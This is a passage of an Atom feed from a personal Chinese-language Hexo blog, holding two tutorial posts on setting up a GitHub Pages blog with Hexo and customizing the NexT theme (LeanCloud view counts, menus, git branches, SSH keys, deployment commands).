class="string">"https://hoxis.github.io"</span>+url+<span class="string">"'&gt;"</span>+<span class="built_in">title</span>+<span class="string">"&lt;/a&gt;"</span>+<span class="string">"&lt;br&gt;"</span>+<span class="string">"&lt;font color='#fff'&gt;"</span>+<span class="string">"阅读次数："</span>+<span class="built_in">time</span>+<span class="string">"&lt;/font&gt;"</span>+<span class="string">"&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line">      <span class="built_in">var</span> <span class="built_in">content</span>=<span class="string">"&lt;p&gt;"</span>+<span class="string">"&lt;font color='#e20404'&gt;"</span>+<span class="string">"【热度"</span>+<span class="built_in">time</span>+<span class="string">"℃】"</span>+<span class="string">"："</span>+<span class="string">"&lt;a href='"</span>+<span class="string">"https://xiaoxiaoxiaoxiaolin.github.io"</span>+url+<span class="string">"'&gt;"</span>+<span class="built_in">title</span>+<span class="string">"&lt;/a&gt;"</span>+<span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line">      document.getElementById(<span class="string">"top"</span>).innerHTML+=<span class="built_in">content</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, function (<span class="built_in">error</span>) &#123;</span><br><span class="line">    console.<span class="built_in">log</span>(<span class="string">"error"</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>　　里面的<code>leancloud_appid</code>、<code>leancloud_appkey</code> 还有页面链接记得替换成你的。</p><h5 id="编辑菜单"><a href="#编辑菜单" class="headerlink" title="编辑菜单"></a>编辑菜单</h5><p>　　打开主题配置文件，添加top：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">menu:</span></span><br><span class="line"><span class="symbol">  home:</span> / || home</span><br><span class="line"><span class="symbol">  top:</span> <span class="meta-keyword">/top/</span> || signal</span><br><span class="line"><span class="symbol">  categories:</span> <span class="meta-keyword">/categories/</span> || th</span><br><span class="line"><span class="symbol">  tags:</span> <span class="meta-keyword">/tags/</span> || tags</span><br><span class="line"><span class="symbol">  archives:</span> <span class="meta-keyword">/archives/</span> || archive</span><br><span class="line"><span class="symbol">  about:</span> <span class="meta-keyword">/about/</span> || user</span><br></pre></td></tr></table></figure><p>　　然后还需要对中文配置<code>hexo/blog/themes/next/languages/zh-CN.yml</code>进行修改，添加top对应的中文：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">menu:</span></span><br><span class="line"><span class="symbol">  home:</span> 首页</span><br><span class="line"><span class="symbol">  top:</span> 热榜</span><br><span class="line"><span class="symbol">  archives:</span> 归档</span><br><span class="line"><span class="symbol">  categories:</span> 分类</span><br><span class="line"><span class="symbol">  tags:</span> 标签</span><br><span class="line"><span class="symbol">  about:</span> 关于</span><br><span class="line"><span class="symbol">  search:</span> 搜索</span><br><span class="line"><span class="symbol">  schedule:</span> 日程表</span><br><span class="line"><span class="symbol">  sitemap:</span> 站点地图</span><br><span class="line"><span class="symbol">  commonweal:</span> 公益 <span class="number">404</span></span><br></pre></td></tr></table></figure><h4 id="github分支管理博客"><a href="#github分支管理博客" class="headerlink" title="github分支管理博客"></a>github分支管理博客</h4><p>　　使用hexo发布博客最麻烦的地方在于，当你换了一台电脑后又想发布博客，又得把先前的环境重新搭建，拉取仓库。因为在github中的我们github.io项目是只有编译后的文件的，没有源文件的，也就是说，如果我们的电脑坏了，打不开了，我们的博客就不能进行更新了，所以我们要把我们的源文件也上传到github上。这个时候可以选择新建一个仓库来存放源文件，也可以把源文件 push 到 user.github.io 的其他分支。我选择了后者。</p><h5 id="创建分支"><a href="#创建分支" class="headerlink" title="创建分支"></a>创建分支</h5><p>　　创建两个分支：master 与 hexo,（这个hexo分支就是存放我们源文件的分支，我们只需要更新hexo分支上的内容据就好，master上的分支hexo编译的时候会更新的）</p><h5 id="初始化仓库"><a href="#初始化仓库" class="headerlink" title="初始化仓库"></a>初始化仓库</h5><p>　　然后我们再初始化仓库，重新对我们的代码进行版本控制</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br><span class="line">git remote <span class="keyword">add</span><span class="bash"> origin &lt;server&gt;</span></span><br></pre></td></tr></table></figure><p>　　<code>&lt;server&gt;</code>是指在线仓库的地址。origin是本地分支,remote add操作会将本地仓库映射到云端</p><h5 id="将博客源文件上传到分支"><a href="#将博客源文件上传到分支" class="headerlink" title="将博客源文件上传到分支"></a>将博客源文件上传到分支</h5><p>　　.gitignore文件作用是声明不被git记录的文件，blog根目录下的.gitignore是hexo初始化带来的，可以先删除或者直接编辑，对hexo不会有影响。建议.gitignore内添加以下内容：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">/.deploy_git</span></span><br><span class="line"><span class="string">/public</span></span><br><span class="line"><span class="string">/_config.yml</span></span><br></pre></td></tr></table></figure><p>　　.deploy_git是hexo默认的.git配置文件夹，不需要同步<br>　　public内文件是根据source文件夹内容自动生成，不需要备份，不然每次改动内容太多<br>　　即使是私有仓库，除去在线服务商员工可以看到的风险外，还有云服务商被攻击造成泄漏等可能，所以不建议将配置文件传上去</p><h5 id="依次执行"><a href="#依次执行" class="headerlink" title="依次执行"></a>依次执行</h5><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">git</span> <span class="keyword">add </span>.</span><br><span class="line"><span class="symbol">git</span> commit -m <span class="string">"..."</span></span><br><span class="line"><span class="symbol">git</span> <span class="keyword">push </span>origin hexo</span><br></pre></td></tr></table></figure><h4 id="更改标签云的颜色"><a href="#更改标签云的颜色" class="headerlink" title="更改标签云的颜色"></a>更改标签云的颜色</h4><p>　　打开<code>/blog/themes/next/layout/page.swig</code>，找到tagcloud，修改为以下内容：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; tagcloud(&#123;<span class="string">min_font:</span> <span class="number">13</span>, <span class="string">max_font:</span> <span class="number">31</span>, <span class="string">amount:</span> <span class="number">1000</span>, <span class="string">color:</span> <span class="literal">true</span>, <span class="string">start_color:</span> <span class="string">'#9733EE'</span>, <span class="string">end_color:</span> <span class="string">'#FF512F'</span>&#125;) &#125;&#125;</span><br></pre></td></tr></table></figure><p>　　<code>start_color</code>和<code>end_color</code>的颜色你可以自己随意定义。</p><h3 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h3><ul><li><h4 id="使用-Hexo-搭建-GitHub-Page-博客-二-–使用-GitHub-分支保存-Hexo-环境和博文"><a href="#使用-Hexo-搭建-GitHub-Page-博客-二-–使用-GitHub-分支保存-Hexo-环境和博文" class="headerlink" title="使用 Hexo 搭建 GitHub Page 博客(二)–使用 GitHub 分支保存 Hexo 环境和博文"></a><a href="https://blog.csdn.net/gatieme/article/details/82317704" target="_blank" rel="noopener">使用 Hexo 搭建 GitHub Page 博客(二)–使用 GitHub 分支保存 Hexo 环境和博文</a></h4></li><li><h4 id="hexo-摸爬滚打之进阶教程"><a href="#hexo-摸爬滚打之进阶教程" class="headerlink" title="hexo 摸爬滚打之进阶教程"></a><a href="http://muyunyun.cn/posts/f55182c5/#more" target="_blank" rel="noopener">hexo 摸爬滚打之进阶教程</a></h4></li><li><h4 id="GitHub–创建新的分支-转"><a href="#GitHub–创建新的分支-转" class="headerlink" title="GitHub–创建新的分支(转)"></a><a href="https://www.cnblogs.com/autoXingJY/p/9004724.html" target="_blank" rel="noopener">GitHub–创建新的分支(转)</a></h4></li><li><h4 id="打造个性超赞博客-Hexo-NexT-GitHub-Pages-的超深度优化"><a href="#打造个性超赞博客-Hexo-NexT-GitHub-Pages-的超深度优化" class="headerlink" title="打造个性超赞博客 Hexo + NexT + GitHub Pages 的超深度优化"></a><a href="https://io-oi.me/tech/hexo-next-optimization.html" target="_blank" rel="noopener">打造个性超赞博客 Hexo + NexT + GitHub Pages 的超深度优化</a></h4></li><li><h4 id="hexo的next主题个性化教程-打造炫酷网站-Moorez"><a href="#hexo的next主题个性化教程-打造炫酷网站-Moorez" class="headerlink" title="hexo的next主题个性化教程:打造炫酷网站 | Moorez"></a><a href="shenzekun.cn/hexo的next主题个性化配置教程.html">hexo的next主题个性化教程:打造炫酷网站 | Moorez</a></h4></li><li><h4 id="4块钱-用Github-Hexo搭建你的个人博客：美化篇"><a href="#4块钱-用Github-Hexo搭建你的个人博客：美化篇" class="headerlink" title="4块钱,用Github+Hexo搭建你的个人博客：美化篇"></a><a href="http://www.makcyun.top/2018/07/17/hexo02.html" target="_blank" rel="noopener">4块钱,用Github+Hexo搭建你的个人博客：美化篇</a></h4></li></ul><p>还有一些参考的资料链接已经找不到了，所以就不一一列出了。第一次写，如有错误，欢迎指出，不胜感激。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote class=&quot;blockquote-center&quot;&gt;日出江花红胜火，春来江水绿如蓝&lt;/blockquote&gt;&lt;p&gt;　　前几天，我写了一篇关于如何使用GitHub＋Hexo搭建个人博客的博文，接下来我会以我的博客为例，讲讲如何对NexT主题的个性化定制和一些细节的优化。&lt;/p&gt;
    
    </summary>
    
      <category term="Hexo" scheme="https://xiaoxiaoxiaoxiaolin.github.io/categories/Hexo/"/>
    
    
      <category term="GitHub" scheme="https://xiaoxiaoxiaoxiaolin.github.io/tags/GitHub/"/>
    
      <category term="个人博客" scheme="https://xiaoxiaoxiaoxiaolin.github.io/tags/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
    
      <category term="Hexo" scheme="https://xiaoxiaoxiaoxiaolin.github.io/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>使用Github+Hexo搭建你的个人博客：搭建篇</title>
    <link href="https://xiaoxiaoxiaoxiaolin.github.io/posts/9464af1e.html/"/>
    <id>https://xiaoxiaoxiaoxiaolin.github.io/posts/9464af1e.html/</id>
    <published>2019-07-21T07:25:12.000Z</published>
    <updated>2019-08-22T01:35:24.191Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center">海阔凭鱼跃，天高任鸟飞</blockquote><p>　　早在初中，就想着自己搭起一个属于自己的网站，但是没有技术又不肯学习的我，怯于尝试，一直停滞不前。大学期间终于学习了，又因为自己的懒惰，觉得很难，不肯去尝试。直至今日，我想试一试，捣鼓了好一阵子，发现认真去做了，也没有想象中的难。</p><a id="more"></a><p>　　其实早在放假之前，我就一直在捣鼓自己的博客了，使用的是<a href="https://www.djangoproject.com/" target="_blank" rel="noopener">Django</a>。搞了好一阵子，就只剩一些细节的问题，准备上线的时候，<a href="https://hexo.io/zh-cn/" target="_blank" rel="noopener">Hexo</a>出现在我的眼前,简约的风格一下子吸引了我，这正是我想要的。好了，别说了，我改还不行吗，就这样我已经搭好准备上线的Django，转入Hexo。</p><h3 id="自己建站的原因"><a href="#自己建站的原因" class="headerlink" title="自己建站的原因"></a>自己建站的原因</h3><p>　　网上这么多现成的博客不用，为什么非得浪费这么多时间去自己搭建呢？<br>　　可能会有人这样说：很多网站都能写博客，干嘛这么浪费时间呢？<br>　　在这里我说一下我想自己搭建的原因:<br>　　1、网上大部分的博客功能都是差不多的，但是限制也是挺多的，花里胡哨的广告，文章不管是自己还是别人看，体验都很不舒服。<br>　　2、除了广告的原因，排版的限制以外，拥有一个自己可以随意定制的博客网站，内容和排版都自己可以随意决定，是不是很酷。<br>　　除此以外，自己在这段时间确实学习到了很多。宅在家里好一段时间，除了吃饭睡觉就是搭建自己的博客。搭建博客也是成为了我学习的动力，现在搭建好了之后，也不会觉得没有事情干，相反，会因为博客的空白而继续努力学习、写博客、写自己的想法，努力让自己的博客、生活、还有学习充实起来。</p><h3 id="开始搭建博客"><a href="#开始搭建博客" class="headerlink" title="开始搭建博客"></a>开始搭建博客</h3><p>什么是Hexo？</p><p>　　Hexo是一个快速、简洁且高效的博客框架。Hexo 使用 <a href="http://daringfireball.net/projects/markdown/" target="_blank" rel="noopener">Markdown</a>（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</p><h4 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h4><p>Hexo安装前提</p><p>　　安装 Hexo 相当简单。然而在安装前，必须检查电脑中是否已安装下列应用程序：</p><ul><li><a href="http://nodejs.org/" target="_blank" rel="noopener">Node.js</a> (Should be at least nodejs 6.9)</li><li><a href="http://git-scm.com/" target="_blank" rel="noopener">Git</a></li></ul><p>　　如果你的电脑中已经安装上述必备程序，那么恭喜！接下来只需要使用 npm 即可完成 Hexo 的安装。</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-<span class="keyword">cli</span></span><br></pre></td></tr></table></figure><p>　　如果你的电脑中尚未安装所需要的程序，请自行百度或者Google完成安装。<br>　　安装好所有环境之后，可以用以下命令是否安装成功，如果有返回版本信息说明安装成功。</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">version</span></span><br><span class="line"><span class="keyword">node</span> <span class="title">-v</span></span><br><span class="line">npm -v</span><br></pre></td></tr></table></figure><h4 id="Hexo安装"><a href="#Hexo安装" class="headerlink" title="Hexo安装"></a>Hexo安装</h4><ul><li>安装hexo</li></ul><p>　　桌面右键点击git bash here，打开git软件界面，输入以下命令并回车：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm <span class="keyword">install</span> hexo-cli -g</span><br><span class="line">npm <span class="keyword">install</span> hexo-deployer-git <span class="comment">--save</span></span><br></pre></td></tr></table></figure><p>　　第一句是安装hexo，第二句是安装hexo部署到git page的deployer。</p><ul><li>设置博客存放的目录</li></ul><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hexo init <span class="string">/h/blog</span></span><br><span class="line"><span class="keyword">cd</span> <span class="string">/h/blog</span></span><br><span class="line">npm install</span><br><span class="line">*注：<span class="string">/h/bog</span>可以更改为你自己的文件夹*</span><br></pre></td></tr></table></figure><p>　　有的教程是先建立起博客的文件夹，再在该文件夹下右键鼠标，点击Git Bash Here，进入Git命令框，再执行以下操作。操作因人而异，没多大影响，只要能成功搭建就没问题了。</p><ul><li>查看博客的效果</li></ul><p>　　至此，一个博客就初步搭建好了，先预览一下：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo g <span class="meta">&amp;&amp; hexo s</span></span><br></pre></td></tr></table></figure><p>　　然后在浏览器中打开：localhost:4000就可以看到博客的样子了。<br><img src="/posts/9464af1e.html/1.jpg" alt></p><p>　　打开该网址，你可以看到第一篇默认的博客：<strong>Hello World</strong>。虽然看起来有点难看，但是后续我们可以通过重新选择模板来对博客进行美化。</p><h4 id="把博客部署到GitHub"><a href="#把博客部署到GitHub" class="headerlink" title="把博客部署到GitHub"></a>把博客部署到GitHub</h4><h5 id="Github账号注册及配置"><a href="#Github账号注册及配置" class="headerlink" title="Github账号注册及配置"></a>Github账号注册及配置</h5><p>　　如果你没有github帐号，就新建一个，然后去邮箱进行验证；如果你有帐号则直接登录。官网：<a href="https://github.com/" target="_blank" rel="noopener">https://github.com/</a></p><h5 id="建立new-repository"><a href="#建立new-repository" class="headerlink" title="建立new repository"></a>建立new repository</h5><p>　　只填写username.github.io即可，然后点击<code>create repositrory</code>。<br>　　注意：<code>username.github.io</code> 的<code>username</code>要和用户名保持一致，不然后面会失败。以我的为例：<br><img src="/posts/9464af1e.html/2.png" alt></p><p><img src="/posts/9464af1e.html/3.png" alt></p><h5 id="开启gh-pages功能"><a href="#开启gh-pages功能" class="headerlink" title="开启gh-pages功能"></a>开启gh-pages功能</h5><p>　　点击github主页点击头像下面的profile,找到新建立的username.github.io文件打开，点击settings，往下拉动鼠标到GitHub Pages。<br>如果你看到上方出现以下警告：</p><blockquote><p>GitHub Pages is currently disabled. You must first add content to your repository before you can publish a GitHub Pages site</p></blockquote><p>　　不用管，点击选择<code>choose a theme</code>，随便选择一个，然后select theme保存就行了。<br><img src="/posts/9464af1e.html/4.png" alt></p><p><img src="/posts/9464af1e.html/5.png" alt></p><h5 id="配置ssh密钥"><a href="#配置ssh密钥" class="headerlink" title="配置ssh密钥"></a>配置ssh密钥</h5><p>　　配置Github的SSH密钥可以让本地git项目与远程的github建立联系，让我们在本地写了代码之后直接通过git操作就可以实现本地代码库与Github代码库同步。操作如下：</p><ul><li>看看是否存在SSH密钥</li></ul><p>　　首先，我们需要看看是否看看本机是否存在SSH keys,打开Git Bash,并运行：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> ~<span class="string">/.</span> ssh</span><br></pre></td></tr></table></figure><p>　　检查你本机用户home目录下是否存在.ssh目录<br>　　如果，不存在此目录，则进行第二步操作，否则，你本机已经存在ssh公钥和私钥，可以略过第二步，直接进入第三步操作。</p><ul><li>创建一对新的SSH密钥</li></ul><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ssh-keygen -t rsa -C <span class="string">"your_email@example.com"</span></span><br><span class="line"><span class="comment">#这将按照你提供的邮箱地址，创建一对密钥，记得修改</span></span><br></pre></td></tr></table></figure><p>　　直接回车，则将密钥按默认文件进行存储。此时也可以输入指定的文件夹。然后根据提示，你需要输入密码和确认密码，其实可以不用密码，就是到输密码的地方，都直接回车，所以每次push就只管回车就行了。跟着提示操作就对了，这里没什么坑。</p><ul><li>在GitHub账户中添加公钥</li></ul><p>　　运行如下命令，并将公钥的内容复制。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clip &lt; ~<span class="regexp">/.ssh/i</span>d_rsa.pub</span><br></pre></td></tr></table></figure><ul><li>登陆GitHub，进入账户设置，在SSH Keys粘贴添加就可以了</li></ul><p><img src="/posts/9464af1e.html/6.png" alt></p><ul><li>测试</li></ul><p>　　输入以下命令，看看[设置是否成功，<a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>的部分不要修改：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>ssh -T git<span class="variable">@github</span>.com</span><br></pre></td></tr></table></figure><blockquote><p>The authenticity of host ‘github.com (207.97.227.239)’ can’t be established.<br>RSA key fingerprint is 16:27:ac:a5:76:28:2d:36:63:1b:56:4d:eb:df:a6:48.<br>Are you sure you want to continue connecting (yes/no)?</p></blockquote><p>　　如果是第一次的会提示是否continue，输入yes就会看到：You’ve successfully authenticated, but GitHub does not provide shell access 。这就表示已成功连上github。</p><ul><li>设置用户信息</li></ul><p>　　现在你已经可以通过SSH链接到GitHub了，还有一些个人信息需要完善的。 Git会根据用户的名字和邮箱来记录提交。GitHub也是用这些信息来做权限的处理，输入下面的代码进行个人信息的设置，把名称和邮箱替换成你自己的，名字根据自己的喜好自己取，而不是GitHub的昵称。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global user<span class="selector-class">.name</span> <span class="string">"你的用户名"</span><span class="comment">//用户名</span></span><br><span class="line">$ git config --global user<span class="selector-class">.email</span>  <span class="string">"你的邮箱"</span><span class="comment">//填写自己的邮箱</span></span><br></pre></td></tr></table></figure><ul><li>将本地的Hexo文件更新到GitHub的库中</li></ul><p>　　SSH Key配置成功后，接下来我们要把本地的Hexo文件上传到GitHub库中。<br>　　打开Hexo文件夹下的_config.yml，这个是博客的配置文件，添加你的GitHub page url<br><img src="/posts/9464af1e.html/7.png" alt></p><p>　　然后执行以下命令：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo g <span class="meta">&amp;&amp; hexo d 或者 hexo g -d</span></span><br></pre></td></tr></table></figure><p>　　此时在浏览器打开你的主页地址，你就能看到你的博客了。</p><h4 id="写下自己的第一篇博客"><a href="#写下自己的第一篇博客" class="headerlink" title="写下自己的第一篇博客"></a>写下自己的第一篇博客</h4><p>　　接下来你可以在博客的根目录下运行命令：</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo <span class="keyword">new</span> <span class="string">"第一篇博客"</span></span><br></pre></td></tr></table></figure><p>　　然后打开<code>D:\blog\source\_posts</code>文件夹，就可以看到一个<code>第一篇博客.md</code>的文件，用支持markdown语法的软件打开该文件进行编辑即可。<br>　　编辑好以后，运行下述命令：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo clean <span class="meta">&amp;&amp; hexo d -g</span></span><br></pre></td></tr></table></figure><p>　　然后，在网址中输入<code>username.github.io</code>即可看到你的博客上，出现“第一篇博客”这篇新的文章。<br>　　至此，你的个人博客初步搭建过程就完成了。</p><h3 id="相关补充"><a href="#相关补充" class="headerlink" title="相关补充"></a>相关补充</h3><p>　　在以后的博客发布，都是需要使用Markdown语法去写的，所以我们需要对markdown有所了解。<br>　　关于markdown的语法介绍可以看看这篇文章：<a href="https://www.jianshu.com/p/1e402922ee32/" target="_blank" rel="noopener">markdown——入门指南</a><br>　　当你大致了解markdown语法后，如何用markdown写博客呢？不妨参考这两篇详细教程：</p><blockquote><p><a href="https://markdown.tw/" target="_blank" rel="noopener">Markdown语法说明</a><br><a href="https://www.ofind.cn/archives/" target="_blank" rel="noopener">Hexo下的Markdown语法(GFM)写博客</a></p></blockquote><p>　　接下来你还得需要一个高效的markdown软件，这里我是用的是<a href="https://typora.io/" target="_blank" rel="noopener">Typora</a>，安装好后就可以打开刚刚的<code>第一篇博客.md</code>，开始尝试写你的第一篇博客了。<br>　　写完之后，别忘了在博客根目录下再次运行：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo clean <span class="meta">&amp;&amp; hexo d -g</span></span><br></pre></td></tr></table></figure><p>　　到这里，博客的初步搭建就算完成了，如果中间出现差错，请保持耐心多试几次，办法总比问题多嘛！关于Hexo的一些了解和常用命令，<a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="noopener">请自行查阅官方文档</a>，一般可解决大部分的问题。<br>　　此时，还有一个比较重要的问题就是，博客的美化问题，下一篇文章，我会以我的博客为例，讲一讲我的博客是如何进行美化的。</p><p>　　第一次写博客，如有问题，欢迎指出，谢谢各位大佬，我会继续努力的。</p><p><img src="/posts/9464af1e.html/%E5%BF%83%E8%8A%B1%E6%80%92%E6%94%BE.gif" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote class=&quot;blockquote-center&quot;&gt;海阔凭鱼跃，天高任鸟飞&lt;/blockquote&gt;&lt;p&gt;　　早在初中，就想着自己搭起一个属于自己的网站，但是没有技术又不肯学习的我，怯于尝试，一直停滞不前。大学期间终于学习了，又因为自己的懒惰，觉得很难，不肯去尝试。直至今日，我想试一试，捣鼓了好一阵子，发现认真去做了，也没有想象中的难。&lt;/p&gt;
    
    </summary>
    
      <category term="Hexo" scheme="https://xiaoxiaoxiaoxiaolin.github.io/categories/Hexo/"/>
    
    
      <category term="GitHub" scheme="https://xiaoxiaoxiaoxiaolin.github.io/tags/GitHub/"/>
    
      <category term="个人博客" scheme="https://xiaoxiaoxiaoxiaolin.github.io/tags/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
    
      <category term="Hexo" scheme="https://xiaoxiaoxiaoxiaolin.github.io/tags/Hexo/"/>
    
  </entry>
  
</feed>
